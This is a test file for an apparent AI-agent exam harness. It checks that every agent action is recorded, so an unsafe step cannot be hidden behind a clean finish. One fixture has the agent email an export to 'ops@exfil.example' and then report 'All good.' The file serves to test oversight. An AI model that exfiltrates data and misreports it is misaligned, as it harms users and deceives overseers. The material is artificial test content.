'use strict';

// Recorded episodes: every action an agent takes in a behaviour item is a
// command on the attempt, and the item's response is the Engine's record of
// those steps. An agent cannot take an unsafe action and then submit a clean
// list (review of the stateless step route).

const test = require('node:test');
const assert = require('node:assert/strict');
const { AGENT, SAFE, boot, grade, adminView } = require('./exam-harness');

async function started(t, appOptions) {
  const ctx = await boot(t, appOptions ? { appOptions } : {});
  const reply = await ctx.call('POST', '/internal/attempts', { idempotencyKey: 'start' });
  assert.equal(reply.status, 201);
  return { ctx, attempt: reply.body.attempt };
}
const behaviourItem = (attempt, slotId) => attempt.form.items.find((item) => item.slotId === slotId);
const step = (ctx, attempt, item, action, key) => ctx.call('POST', `/internal/attempts/${attempt.attemptId}/episodes/${item.id}/steps`,
  { idempotencyKey: key, expectedSequence: attempt.sequence, action });

test('an unsafe action stays on the record even when the agent then finishes cleanly', async (t) => {
  const { ctx, attempt } = await started(t);
  const v2 = behaviourItem(attempt, 'v2');
  const first = await step(ctx, attempt, v2, { tool: 'send_email', args: { to: 'ops@exfil.example', body: 'export' } }, 's1');
  assert.equal(first.status, 200);
  const done = await step(ctx, first.body.attempt, v2, { finish: { message: 'All good.' } }, 's2');
  assert.equal(done.body.done, true);
  let current = done.body.attempt;
  for (const [index, item] of attempt.form.items.entries()) {
    if (item.id === v2.id) continue;
    const reply = item.kind === 'behaviour'
      ? await step(ctx, current, item, { finish: { message: 'done' } }, `f-${index}`)
      : await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/responses`, { idempotencyKey: `r-${index}`,
        expectedSequence: current.sequence, itemId: item.id, response: SAFE });
    current = reply.body.attempt;
  }
  await grade(ctx, current);
  const view = await adminView(ctx, current);
  const outcome = view.assessment.itemOutcomes.find((item) => item.itemId === v2.id);
  assert.deepEqual(outcome.criticalViolationRuleIds, ['critical-o4']);
});

test('a behaviour item cannot be answered with text, and no step is recorded after it ends', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const text = await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/responses`, { idempotencyKey: 'text',
    expectedSequence: attempt.sequence, itemId: v1.id, response: '{"schemaVersion":"episode-actions/1.0.0","actions":[{"finish":{"message":"x"}}]}' });
  assert.deepEqual([text.status, text.body.error], [409, 'behaviour_item_requires_steps']);
  const ended = await step(ctx, attempt, v1, { finish: { message: 'done' } }, 'end');
  const late = await step(ctx, ended.body.attempt, v1, { tool: 'escalate', args: { reason: 'late' } }, 'late');
  assert.deepEqual([late.status, late.body.error], [409, 'episode_ended']);
});

test('another agent cannot read or step this attempt\'s episode', async (t) => {
  const { ctx, attempt } = await started(t);
  const v1 = behaviourItem(attempt, 'v1');
  const other = { ...AGENT, 'x-actor-subject': 'someone-else' };
  const read = await ctx.call('GET', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}`, undefined, other);
  const write = await ctx.call('POST', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}/steps`,
    { idempotencyKey: 'x', expectedSequence: attempt.sequence, action: { finish: { message: 'x' } } }, other);
  assert.ok([403, 404].includes(read.status) && [403, 404].includes(write.status), `${read.status} ${write.status}`);
});

test('without the Engine\'s seed key no world is shown and no step is recorded', async (t) => {
  const { ctx, attempt } = await started(t, { episodeSeedKey: '' });
  const v1 = behaviourItem(attempt, 'v1');
  const read = await ctx.call('GET', `/internal/attempts/${attempt.attemptId}/episodes/${v1.id}`);
  const write = await step(ctx, attempt, v1, { finish: { message: 'x' } }, 'nokey');
  assert.deepEqual([read.status, read.body.error, write.status, write.body.error],
    [503, 'episode_seed_key_not_configured', 503, 'episode_seed_key_not_configured']);
});
